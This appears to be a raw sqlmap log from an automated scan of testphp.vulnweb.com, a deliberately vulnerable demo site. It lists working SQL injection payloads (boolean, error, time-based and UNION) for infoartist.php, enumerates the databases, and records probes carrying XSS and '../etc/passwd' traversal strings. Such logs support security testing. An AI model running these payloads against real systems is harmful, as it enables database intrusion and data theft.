+[08:58:05] [INFO] testing URL 'http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb'
+[08:58:05] [INFO] resuming back-end DBMS 'mysql' 
+[08:58:05] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0858am.csv' as the CSV results file in multiple targets mode
+[08:58:05] [INFO] testing connection to the target URL
+[08:58:06] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1056 OR 4787=4787#
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: id=GTID_SUBSET(CONCAT(0x717a6a7871,(SELECT (ELT(1272=1272,1))),0x717a626271),1272)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: id=(CASE WHEN (9725=9725) THEN SLEEP(5) ELSE 9725 END)
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: id=-9815 UNION ALL SELECT 3466,3466,CONCAT(0x717a6a7871,0x4d6f774371416a684349617a736f507a617457637978544d77547a474e476c654e6b59586d4d4c50,0x717a626271)-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:58:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[08:58:06] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[08:58:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0858am.csv'
+
+[*] ending @ 08:58:06 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?p=valid
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?pp=" onmouseover="xss()" bad="
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/index.php?user=1
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?RrHdLZ=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?mb9zbc=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?Q1xN8b=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/showimage.php?file='"-->%
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?12hBbm=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/?input=../etc/passwd
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/listproducts.php?zfdfasdf=124fff...
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?nV9h5w=
+
+[SQLI - detect] http://testphp.vulnweb.com/search?q=aaa
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:31:07 /2025-10-22/
+
+[09:31:07] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[09:31:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/search?q=aaa
+do you want to test this URL? [Y/n/q]
+> Y
+[09:31:07] [INFO] testing URL 'http://testphp.vulnweb.com/search?q=aaa'
+[09:31:07] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0931am.csv' as the CSV results file in multiple targets mode
+[09:31:07] [INFO] testing connection to the target URL
+[09:31:08] [CRITICAL] page not found (404)
+[09:31:08] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[09:31:08] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0931am.csv'
+
+[*] ending @ 09:31:08 /2025-10-22/
+
+
+
+[SQLI - detect] http://testphp.vulnweb.com/?cmd=\' OR \'1\'=\'1
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:31:09 /2025-10-22/
+
+[09:31:09] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[09:31:09] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/?cmd=\' OR \'1\'=\'1
+do you want to test this URL? [Y/n/q]
+> Y
+[09:31:09] [INFO] testing URL 'http://testphp.vulnweb.com/?cmd=\' OR \'1\'=\'1'
+[09:31:09] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0931am.csv' as the CSV results file in multiple targets mode
+[09:31:09] [INFO] testing connection to the target URL
+[09:31:09] [INFO] checking if the target is protected by some kind of WAF/IPS
+[09:31:10] [INFO] testing if the target URL content is stable
+[09:31:10] [INFO] target URL content is stable
+[09:31:10] [INFO] testing if GET parameter 'cmd' is dynamic
+[09:31:10] [WARNING] GET parameter 'cmd' does not appear to be dynamic
+[09:31:11] [WARNING] heuristic (basic) test shows that GET parameter 'cmd' might not be injectable
+[09:31:11] [INFO] testing for SQL injection on GET parameter 'cmd'
+[09:31:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:31:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[09:31:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[09:31:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[09:31:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[09:31:31] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[09:31:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[09:31:44] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[09:31:51] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[09:31:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[09:32:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:32:06] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[09:32:06] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[09:32:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[09:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[09:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[09:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[09:32:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[09:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[09:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[09:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
+[09:32:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0931am.csv'
+
+[*] ending @ 09:32:10 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?FtT0fz=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?tGIp6i=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?jjh0o9=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?Fs0URi=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?2RyQru=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?MMAYMn=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?r\u003dhttps://festivetreat.com=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?nL1wvR=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?COsT1S=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?iCKP5x=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?tcbdBS=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?IsG51C=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?brLBIP=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?XsmmCI=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?pa0mnJ=
+
+[SQLI - detect] http://testphp.vulnweb.com/redir.php?9RjQ2j=
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:30:16 /2025-10-22/
+
+[09:30:16] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[09:30:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/redir.php?9RjQ2j=
+do you want to test this URL? [Y/n/q]
+> Y
+[09:30:16] [INFO] testing URL 'http://testphp.vulnweb.com/redir.php?9RjQ2j='
+[09:30:16] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0930am.csv' as the CSV results file in multiple targets mode
+[09:30:16] [INFO] testing connection to the target URL
+[09:30:17] [INFO] testing if the target URL content is stable
+[09:30:17] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[09:30:17] [INFO] testing if GET parameter '9RjQ2j' is dynamic
+[09:30:17] [WARNING] GET parameter '9RjQ2j' does not appear to be dynamic
+[09:30:18] [WARNING] heuristic (basic) test shows that GET parameter '9RjQ2j' might not be injectable
+[09:30:18] [INFO] testing for SQL injection on GET parameter '9RjQ2j'
+[09:30:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:30:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[09:30:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[09:30:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[09:30:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[09:30:38] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[09:30:44] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[09:30:51] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[09:30:59] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[09:31:10] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[09:31:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:31:22] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[09:31:22] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[09:31:23] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[09:31:23] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[09:31:24] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[09:31:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[09:31:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[09:31:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[09:31:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[09:31:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[09:31:27] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[09:31:27] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[09:31:27] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[09:31:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[09:31:28] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[09:31:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[09:31:35] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[09:31:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[09:31:42] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[09:31:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[09:31:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[09:32:03] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[09:32:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[09:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[09:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[09:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[09:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[09:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[09:32:10] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[09:32:10] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
+[09:32:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0930am.csv'
+
+[*] ending @ 09:32:10 /2025-10-22/
+
+
+
+[SQLI - dbs] http://testphp.vulnweb.com/redir.php?9RjQ2j=
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:32:11 /2025-10-22/
+
+[09:32:11] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[09:32:11] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/redir.php?9RjQ2j=
+do you want to test this URL? [Y/n/q]
+> Y
+[09:32:11] [INFO] testing URL 'http://testphp.vulnweb.com/redir.php?9RjQ2j='
+[09:32:11] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0932am.csv' as the CSV results file in multiple targets mode
+[09:32:11] [INFO] testing connection to the target URL
+[09:32:12] [INFO] testing if the target URL content is stable
+[09:32:12] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[09:32:12] [INFO] testing if GET parameter '9RjQ2j' is dynamic
+[09:32:12] [WARNING] GET parameter '9RjQ2j' does not appear to be dynamic
+[09:32:13] [WARNING] heuristic (basic) test shows that GET parameter '9RjQ2j' might not be injectable
+[09:32:13] [INFO] testing for SQL injection on GET parameter '9RjQ2j'
+[09:32:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:32:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:32:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[09:32:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[09:32:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[09:32:49] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
+[09:32:49] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[09:32:49] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[09:32:51] [INFO] testing 'Generic inline queries'
+[09:32:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[09:32:51] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[09:32:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[09:32:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[09:32:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[09:32:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[09:32:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[09:33:00] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[09:33:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[09:33:04] [WARNING] GET parameter '9RjQ2j' does not seem to be injectable
+[09:33:04] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
+[09:33:04] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0932am.csv'
+
+[*] ending @ 09:33:04 /2025-10-22/
+
+
